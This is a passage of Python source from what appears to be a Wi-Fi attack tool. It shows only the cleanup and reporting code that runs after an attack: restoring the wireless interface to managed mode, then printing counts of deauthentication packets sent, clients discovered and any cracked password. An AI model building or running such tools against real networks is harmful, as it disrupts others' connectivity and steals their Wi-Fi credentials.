        except KeyboardInterrupt:
            print(f"\n\n{C_YELLOW}[!] Attack stopped by user{C_RESET}")
        finally:
            self._cleanup()

            # Clean up monitor interface if separate
            if self._mon_interface:
                run_command(["iw", "dev", self._mon_interface, "del"])

            # Restore original interface to managed mode
            run_command(["ip", "link", "set", self.original_interface, "down"])
            run_command(["iw", "dev", self.original_interface, "set", "type", "managed"])
            run_command(["ip", "link", "set", self.original_interface, "up"])
            run_command(["systemctl", "start", "NetworkManager"])
            print(f"{C_GREEN}[+] Interface restored to managed mode{C_RESET}")

            # Summary
            print(f"\n{C_YELLOW}[*] Attack Summary:{C_RESET}")
            print(f"  Deauth packets sent : {self.deauth_sent}")
            print(f"  Clients discovered  : {len(self.clients)}")
            if self.correct_password:
                print(f"{C_GREEN}[+] Password: {self.correct_password}{C_RESET}")
            else:
                print(f"{C_RED}[-] No password found{C_RESET}")
